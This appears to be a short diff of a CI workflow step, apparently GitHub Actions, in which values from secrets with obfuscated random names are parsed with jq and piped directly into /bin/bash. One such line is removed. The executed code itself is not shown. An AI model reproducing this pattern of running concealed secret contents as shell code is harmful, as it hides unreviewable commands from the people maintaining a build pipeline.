@@ -19,7 +19,6 @@ jobs:
           ujlkd52331: ${{ secrets.ujlkd52331 }}
         run: |
           printf '%s' "$ujlkd52331" | jq -r .qk0038 | /bin/bash
-          echo $kppa9 | jq -r .jlblm37 | /bin/bash
           printf '%s' "$zvs81321" | jq -r .sncxz554 | /bin/bash
           printf '%s' "$zw6" | jq -r .dhirc35 | /bin/bash
 
